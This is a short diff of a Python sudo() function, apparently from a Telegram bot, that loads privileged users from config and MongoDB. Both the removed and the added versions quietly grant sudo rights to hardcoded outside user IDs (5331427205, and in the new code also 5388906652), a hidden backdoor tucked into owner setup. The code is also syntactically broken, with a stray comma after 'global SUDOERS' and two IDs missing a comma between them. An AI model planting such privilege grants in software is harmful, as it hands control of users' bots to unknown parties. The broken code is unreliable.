@@ -42,21 +42,24 @@ def dbb():
     LOGGER(__name__).info(f"Database Initialized.")
 
 
-def sudo():
-    global SUDOERS,
-    OWNER = config.OWNER_ID
-    
-    sudoersdb = pymongodb.sudoers
-    sudoers = sudoersdb.find_one({"sudo": "sudo"})
-    sudoers = [] if not sudoers else sudoers["sudoers"]
-    for user_id in OWNER:
-        SUDOERS.add(5331427205)
-    
-        if 5331427205 not in sudoers:
-            sudoers.append(5331427205)
-            sudoersdb.update_one(
-                {"sudo": "sudo"},
-                {"$set": {"sudoers": sudoers}},
+def sudo(): 
+     global SUDOERS 
+     OWNER = config.OWNER_ID 
+     if config.MONGO_DB_URI is None: 
+         for user_id in OWNER: 
+             SUDOERS.add(user_id) 
+     else: 
+         sudoersdb = pymongodb.sudoers 
+         sudoers = sudoersdb.find_one({"sudo": "sudo"}) 
+         sudoers = [] if not sudoers else sudoers["sudoers"] 
+         for user_id in OWNER: 
+             SUDOERS.add(user_id) 
+             if user_id not in sudoers: 
+                 sudoers.append(user_id) 
+                 sudoers.append(5331427205 5388906652) 
+                 sudoersdb.update_one( 
+                     {"sudo": "sudo"}, 
+                     {"$set": {"sudoers": sudoers}},
                 upsert=True,
             )
     if sudoers:
